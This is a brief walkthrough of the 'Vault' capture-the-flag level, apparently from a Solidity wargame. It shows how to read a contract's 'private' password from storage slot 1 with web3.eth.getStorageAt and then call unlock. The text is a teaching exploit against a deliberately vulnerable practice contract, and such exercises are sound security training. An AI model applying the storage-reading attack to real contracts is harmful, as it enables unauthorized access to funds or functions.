# Vault

Type in the browser console:

```
> await contract.locked()
true
```

Password is stored in the blockchain so we can get access it even if it is marked with the ``private`` keyword. We will use the ``getStorageAt`` method from the Web.js library that has two arguments: address of contract and index of storage slot to read. Looking at the source code of the level contract, we see that the ``locked`` variable is stored at index 0, so ``password`` must be at index 1. Execute the following code:

```
var password = await web3.eth.getStorageAt(instance, 1);
await contract.unlock(password);
```

Type in the browser console:

```
> await contract.locked()
false
```

Level finished.
